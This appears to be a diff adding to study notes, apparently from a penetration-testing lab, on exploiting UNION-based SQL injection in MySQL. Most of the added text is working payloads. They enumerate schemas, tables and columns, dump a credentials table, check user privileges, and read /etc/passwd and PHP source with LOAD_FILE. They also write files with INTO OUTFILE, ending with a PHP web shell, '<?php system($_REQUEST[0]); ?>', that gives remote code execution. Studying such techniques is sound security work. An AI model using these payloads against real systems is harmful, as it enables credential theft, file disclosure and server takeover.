@@ -239,3 +239,89 @@ We also need to know which columns are printed into the application. We can inje
 `cn' UNION select 1,@@version,3,4-- -`.
 
 This way, we have found where we need to put our injection.
+
+Once we have the SQL injection working, we can run some interesting queries:
+
+```sql
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+This finds all the available database in the server. 
+
+We can find the current database with `SELECT database()`.
+
+We can use information schema database and tables table to retrieve a list of all the available tables:
+
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+
+Here, we're using UNION SQL injection to dump all the tables available for the database `dev`.
+
+A similar thing can be done to retrieve the columns of certain table:
+
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+
+This will list the columns of the table named `credentials`.
+
+Now we can dump the data in the credentials table:
+
+`cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+
+Note the dot operator: the application is using another database than `dev`. The dot operator is need to access other than the configured database.
+
+## Reading files
+
+Under certain conditions databases might be able to read files.
+
+The users have certain privileges configured, so first we need to gather which privileges the application user has.
+
+First, we need to know what user is the application using to deal with the data:
+
+`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`
+
+Now we can determine the privileges of the user:
+
+`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+
+If `FILE` privilege is granted, we can read files. Reading files cannot be simpler (if everything is setup correctly):
+
+`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+
+This will dump the contents of `/etc/passwd`. We can dump the source code of the current php script as well:
+
+`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`. The problem is that the code is rendered, however, we can check the HTML source of the page and we'll see the PHP code.
+
+## Writing files
+
+Writing files require more privileges and more configuration:
+
+1. `FILE` privilege enabled.
+2. MySQL global secure_file_priv variable not enabled
+3. Write access to the location we want to write to on the back-end server
+
+We can check the `secure_file_priv` variable using the SQLi:
+
+`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+If the result of the variable is empty, it means that we can read/write to any location.
+
+To write to file, we can use `SELECT * INTO OUTFILE <filename>`. For example:
+
+`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
+
+This will write the sentence `file written successfully!` into the file `/var/www/html/proof.txt`, which later we can download using the web server. Now that we can write files, we can even write a web shell:
+
+`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
+
+And get RCE when visiting the `shell.php` page.
